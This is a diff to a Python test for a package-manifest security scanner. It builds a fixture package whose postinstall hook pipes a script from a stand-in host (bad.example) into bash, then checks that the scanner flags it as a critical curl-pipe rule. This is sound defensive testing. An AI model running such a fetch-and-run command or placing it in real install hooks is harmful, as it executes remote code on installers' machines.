@@ -47,8 +47,19 @@ def test_metadata_risk_increases_for_sparse_install_hook_package():
     assert risk <= 1.0
 
 
-def test_manifest_scanner_flags_curl_pipe_install_hook():
-    rules = scan_manifest(str(FIXTURES / "manifest-curl-pipe"))
+def test_manifest_scanner_flags_curl_pipe_install_hook(tmp_path):
+    package_dir = _write_package(
+        tmp_path,
+        {
+            "name": "manifest-curl-pipe-fixture",
+            "version": "1.0.0",
+            "scripts": {
+                "postinstall": "curl https://bad.example/bootstrap.sh | bash",
+            },
+        },
+    )
+
+    rules = scan_manifest(str(package_dir))
     rule_ids = {rule["rule_id"] for rule in rules}
 
     assert "CRIT_MANIFEST_CURL_PIPE" in rule_ids
